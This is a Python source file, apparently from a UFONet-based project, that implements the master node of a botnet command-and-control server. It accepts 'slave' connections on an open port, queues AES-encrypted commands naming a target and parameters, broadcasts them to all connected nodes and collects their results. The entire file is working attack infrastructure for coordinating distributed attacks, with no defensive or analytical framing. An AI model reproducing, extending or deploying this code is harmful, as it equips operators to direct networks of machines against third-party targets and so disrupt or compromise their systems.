#!/usr/bin/env python3 
# -*- coding: utf-8 -*-"
"""
This file is part of the CBT (Core Brim Tech) project, https://www.corebrimtech.com

Copyright (c) 2024 | MOMODU KAMARA-KOLLEH

Distributed Command & Control - Master Node
"""
import socket, threading, json, time, hashlib, base64
from Cryptodome.Cipher import AES
from Cryptodome.Random import get_random_bytes

class C2Master(object):
    """Master node for distributed C2 coordination"""
    
    def __init__(self, ufonet, port=8888):
        self.ufonet = ufonet
        self.port = port
        self.slaves = {}
        self.commands = []
        self.results = {}
        self.running = False
        self.encryption_key = self.generate_key()
        
    def generate_key(self):
        """Generate encryption key"""
        return get_random_bytes(32)
    
    def encrypt_message(self, message):
        """Encrypt message for secure communication"""
        cipher = AES.new(self.encryption_key, AES.MODE_EAX)
        ciphertext, tag = cipher.encrypt_and_digest(json.dumps(message).encode())
        return base64.b64encode(cipher.nonce + tag + ciphertext).decode()
    
    def decrypt_message(self, encrypted):
        """Decrypt received message"""
        data = base64.b64decode(encrypted)
        nonce = data[:16]
        tag = data[16:32]
        ciphertext = data[32:]
        cipher = AES.new(self.encryption_key, AES.MODE_EAX, nonce=nonce)
        return json.loads(cipher.decrypt_and_verify(ciphertext, tag))
    
    def handle_slave(self, conn, addr):
        """Handle slave node connection"""
        slave_id = f"{addr[0]}:{addr[1]}"
        print(f"[Info] [AI] [C2] Slave connected: {slave_id}")
        
        self.slaves[slave_id] = {
            'conn': conn,
            'addr': addr,
            'status': 'connected',
            'last_seen': time.time(),
            'capabilities': []
        }
        
        try:
            while self.running:
                # Send command if available
                if self.commands:
                    command = self.commands.pop(0)
                    encrypted = self.encrypt_message(command)
                    conn.sendall(f"{len(encrypted):010d}{encrypted}".encode())
                
                # Receive result
                try:
                    conn.settimeout(1.0)
                    length_data = conn.recv(10)
                    if length_data:
                        length = int(length_data.decode())
                        encrypted = conn.recv(length).decode()
                        result = self.decrypt_message(encrypted)
                        self.results[result['command_id']] = result
                        print(f"[Info] [AI] [C2] Received result from {slave_id}")
                except socket.timeout:
                    continue
                except Exception as e:
                    print(f"[Error] [AI] [C2] Error receiving from {slave_id}: {e}")
                    break
                
                self.slaves[slave_id]['last_seen'] = time.time()
        except Exception as e:
            print(f"[Error] [AI] [C2] Slave {slave_id} disconnected: {e}")
        finally:
            if slave_id in self.slaves:
                del self.slaves[slave_id]
            conn.close()
    
    def start(self):
        """Start C2 master server"""
        self.running = True
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind(('0.0.0.0', self.port))
        sock.listen(10)
        
        print(f"[Info] [AI] [C2] Master node started on port {self.port}")
        print(f"[Info] [AI] [C2] Encryption key: {base64.b64encode(self.encryption_key).decode()}")
        
        while self.running:
            try:
                conn, addr = sock.accept()
                thread = threading.Thread(target=self.handle_slave, args=(conn, addr))
                thread.daemon = True
                thread.start()
            except Exception as e:
                if self.running:
                    print(f"[Error] [AI] [C2] Error accepting connection: {e}")
    
    def broadcast_command(self, command_type, target, params):
        """Broadcast command to all slaves"""
        command_id = hashlib.md5(f"{time.time()}{target}".encode()).hexdigest()
        command = {
            'id': command_id,
            'type': command_type,
            'target': target,
            'params': params,
            'timestamp': time.time()
        }
        
        self.commands.append(command)
        print(f"[Info] [AI] [C2] Broadcasting command to {len(self.slaves)} slaves")
        return command_id
    
    def get_status(self):
        """Get C2 network status"""
        return {
            'slaves': len(self.slaves),
            'pending_commands': len(self.commands),
            'completed_results': len(self.results),
            'slave_list': list(self.slaves.keys())
        }
